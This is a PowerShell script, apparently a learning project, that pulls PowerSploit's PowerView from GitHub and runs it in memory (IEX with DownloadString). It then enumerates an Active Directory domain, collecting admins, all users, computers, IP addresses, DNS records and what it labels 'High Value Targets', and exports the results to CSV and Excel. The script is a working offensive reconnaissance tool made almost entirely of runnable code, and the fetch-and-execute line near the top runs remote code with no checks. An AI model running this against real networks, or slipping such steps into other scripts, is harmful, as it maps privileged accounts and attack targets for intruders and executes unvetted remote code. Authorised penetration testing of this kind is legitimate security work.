<# 
.SYNOPSIS 
    Quickly enumerate local domain using PowerSploit's PowerView and combine into XLSX
.DESCRIPTION 
    Learning powershell scripting, and this came about.
	Its not full blown script yet (with parameters and such).
	Credit goes to contributers of PowerView
.NOTES 
.LINK 
	PowerSploit PowerView
	https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
	
	Export to CSV
	https://gist.github.com/gregklee/b01348787af0b47d8b30
.EXAMPLE 
    iex('.\PowEnum.ps1'}
#>

Write-Host "To run from a non-domain joined system:" -ForegroundColor Cyan
Write-Host "runas /netonly /user:DOMAIN\USERNAME powershell.exe"

#Start Stopwatch
$stopwatch = [system.diagnostics.stopwatch]::startnew()

#Download PowerView From GitHub
$webclient = New-Object System.Net.WebClient
$webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$url = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1"
Write-Host "Downloading Powerview:" -ForegroundColor Cyan
Write-Host "$url"
IEX $webclient.DownloadString($url)

#Grab Local Domain Using PowerView Function
$domain = Get-Domain | Select-Object -ExpandProperty Name
Write-Host "Starting Enumeration: $domain" -ForegroundColor Cyan

Write-Host "[ ]Domain Controllers | " -NoNewLine
$temp = Get-DomainController -Domain $domain 
if($temp -ne $null){$temp | Export-CSV -NoTypeInformation .\01_DCs.csv}
$count = $temp | measure-object | select-object -expandproperty Count
Write-Host "$count Identified" -ForegroundColor Green

Write-Host "[ ]Domain Admins | " -NoNewLine
$temp = Get-DomainGroupMember -Identity "Domain Admins" -Domain $domain
if($temp -ne $null){$temp | Export-CSV -NoTypeInformation .\02_DAs.csv}
$count = $temp | measure-object | select-object -expandproperty Count
Write-Host "$count Identified" -ForegroundColor Green

Write-Host "[ ]Enterprise Admins | " -NoNewLine
$temp = Get-DomainGroupMember -Identity "Enterprise Admins" -Domain $domain
if($temp -ne $null){$temp | Export-CSV -NoTypeInformation .\03_EAs.csv}
$count = $temp | measure-object | select-object -expandproperty Count
Write-Host "$count Identified" -ForegroundColor Green

Write-Host "[ ]Builtin Administrators | " -NoNewLine
$temp = Get-DomainGroupMember -Identity "Administrators" -Domain $domain
if($temp -ne $null){$temp | Export-CSV -NoTypeInformation .\04_BltAdmins.csv}
$count = $temp | measure-object | select-object -expandproperty Count
Write-Host "$count Identified" -ForegroundColor Green

Write-Host "[ ]All Domain Users | " -NoNewLine
$temp = Get-DomainUser -Domain $domain
if($temp -ne $null){$temp | Export-CSV -NoTypeInformation .\05_Users.csv}
$count = $temp | measure-object | select-object -expandproperty Count
Write-Host "$count Identified" -ForegroundColor Green

Write-Host "[ ]All Domain Groups | " -NoNewLine
$temp = Get-DomainGroup -Domain $domain
if($temp -ne $null){$temp | Export-CSV -NoTypeInformation .\06_Groups.csv}
$count = $temp | measure-object | select-object -expandproperty Count
Write-Host "$count Identified" -ForegroundColor Green

Write-Host "[ ]All Domain Computers | " -NoNewLine
$temp = Get-NetComputer -Domain $domain
if($temp -ne $null){$temp | Export-CSV -NoTypeInformation .\07_Computers.csv}
$count = $temp | measure-object | select-object -expandproperty Count
Write-Host "$count Identified" -ForegroundColor Green

Write-Host "[ ]All Domain Computer IP Addresses  | " -NoNewLine
$temp = Get-DomainComputer -Domain $domain | Get-IPAddress
if($temp -ne $null){$temp | Export-CSV -NoTypeInformation .\08_IPs.csv}
$count = $temp | measure-object | select-object -expandproperty Count
Write-Host "$count Identified" -ForegroundColor Green

Write-Host "[ ]All Domain Controller Local Admins | " -NoNewLine
$temp = Get-DomainController -Domain $domain | Get-NetLocalGroupMember
if($temp -ne $null){$temp | Export-CSV -NoTypeInformation .\09_DCLocalAdmins.csv}
$count = $temp | measure-object | select-object -expandproperty Count
Write-Host "$count Identified" -ForegroundColor Green

Write-Host "[ ]All Domain Subnets | " -NoNewLine
$temp = Get-DomainSubnet -Domain $domain
if($temp -ne $null){$temp | Export-CSV -NoTypeInformation .\10_Subnets.csv}
$count = $temp | measure-object | select-object -expandproperty Count
Write-Host "$count Identified" -ForegroundColor Green

Write-Host "[ ]All DNS Zones & Records | " -NoNewLine
$temp = Get-DomainDNSZone -Domain $domain | Get-DomainDNSRecord
if($temp -ne $null){$temp | Export-CSV -NoTypeInformation .\11_DNSRecords.csv}
$count = $temp | measure-object | select-object -expandproperty Count
Write-Host "$count Identified" -ForegroundColor Green

Write-Host "[ ]All High Value Targets | " -NoNewLine
$temp = Get-DomainController -Domain $domain | Get-NetLocalGroupMember | Select-Object -ExpandProperty MemberName | %{$_ -replace '^[^\\]*\\', ''} | Get-DomainGroupMember -Recurse
if($temp -ne $null){$temp | Export-CSV -NoTypeInformation .\12_HVTs.csv}
$count = $temp | measure-object | select-object -expandproperty Count
Write-Host "$count Identified" -ForegroundColor Green

Invoke-Command -ScriptBlock {
	Write-Host "[ ]Combining CSV Files to XSLX | " -NoNewLine
	$path = (Get-Item -Path ".\" -Verbose).FullName
	$XLOutput =  $path + "\" + $env:USERNAME + "_AllLocalEnumeration" + "_" + $(get-random) + ".xlsx"

	$csvFiles = Get-ChildItem (".\*") -Include *.csv | Sort-Object | Where {$_.Length -ne 0}

	# Create Excel object (visible), workbook and worksheet
	$Excel = New-Object -ComObject excel.application 
	$Excel.visible = $false
	$Excel.sheetsInNewWorkbook = $csvFiles.Count
	$workbooks = $excel.Workbooks.Add()
	$CSVSheet = 1

	Foreach ($CSV in $Csvfiles) {

		$worksheets = $workbooks.worksheets
		$CSVFullPath = $CSV.FullName
		
		$SheetName = ($CSV.name -split "\.")[0]
		$worksheet = $worksheets.Item($CSVSheet)
		$worksheet.Name = $SheetName
		
		# Define the connection string and the starting cell for the data
		$TxtConnector = ("TEXT;" + $CSVFullPath)
		$CellRef = $worksheet.Range("A1")

		# Build, use and remove the text file connector
		$Connector = $worksheet.QueryTables.add($TxtConnector,$CellRef)
		$worksheet.QueryTables.item($Connector.name).TextFileCommaDelimiter = $True 
		$worksheet.QueryTables.item($Connector.name).TextFileParseType  = 1 
		$worksheet.QueryTables.item($Connector.name).Refresh() | Out-Null
		$worksheet.QueryTables.item($Connector.name).delete()

		# Autofit the columns, freeze the top row
		$worksheet.UsedRange.EntireColumn.AutoFit() | Out-Null
		$worksheet.Application.ActiveWindow.SplitRow = 1
		$worksheet.Application.ActiveWindow.FreezePanes = $true

		# Set color & border to top header row
		$Selection = $worksheet.cells.Item(1,1).EntireRow
		$Selection.Interior.ColorIndex = 37
		$Selection.BorderAround(1) | Out-Null
		$Selection.Font.Bold=$True
		
		$CSVSheet++
	}

	# Save workbook and close Excel
	$workbooks.SaveAs($XLOutput,51)
	$workbooks.Saved = $true
	$workbooks.Close()
	[System.Runtime.Interopservices.Marshal]::ReleaseComObject($workbooks) | Out-Null
	$Excel.Quit()
	[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel) | Out-Null
	Write-Host " $CSVSheet Sheeet(s) Processed" -ForegroundColor Green
	[System.GC]::Collect()
	[System.GC]::WaitForPendingFinalizers()
}

$stopwatch.Stop()
Write-Host "Running Time: $($stopwatch.Elapsed.TotalSeconds) seconds"
Write-Host "Exiting..." -ForegroundColor Yellow